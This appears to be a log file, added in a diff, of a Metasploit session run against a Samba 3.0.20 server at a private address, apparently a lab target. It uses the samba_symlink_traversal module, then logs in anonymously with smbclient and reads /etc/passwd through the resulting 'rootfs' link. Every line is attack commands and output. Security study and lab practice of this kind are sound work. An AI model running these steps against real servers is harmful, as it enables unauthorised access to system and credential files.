@@ -1,0 +1,28 @@
+msf > use auxiliary/admin/smb/samba_symlink_traversal
+msf auxiliary(samba_symlink_traversal) > set RHOST 192.168.16.220
+RHOST => 192.168.16.220
+msf auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
+SMBSHARE => tmp
+msf auxiliary(samba_symlink_traversal) > exploit
+
+[*] 192.168.16.220:445 - Connecting to the server...
+[*] 192.168.16.220:445 - Trying to mount writeable share 'tmp'...
+[*] 192.168.16.220:445 - Trying to link 'rootfs' to the root filesystem...
+[-] 192.168.16.220:445 - Auxiliary failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_COLLISION (Command=50 WordCount=0)
+[-] 192.168.16.220:445 - Call stack:
+[-] 192.168.16.220:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:259:in `smb_recv_parse'
+[-] 192.168.16.220:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1666:in `trans2'
+[-] 192.168.16.220:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1787:in `symlink'
+[-] 192.168.16.220:445 -   /usr/share/metasploit-framework/modules/auxiliary/admin/smb/samba_symlink_traversal.rb:60:in `run'
+[*] Auxiliary module execution completed
+msf auxiliary(samba_symlink_traversal) > exit
+root@kali8:~# smbclient //192.168.16.220/tmp
+WARNING: The "syslog" option is deprecated
+Enter root's password:
+Anonymous login successful
+Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
+smb: \> cd rootfs
+smb: \rootfs\> cd etc
+smb: \rootfs\etc\> more passwd
+getting file \rootfs\etc\passwd of size 1624 as /tmp/smbmore.TGNDsy (264.3 KiloBytes/sec) (average 264.3 KiloBytes/sec)
+smb: \rootfs\etc\>
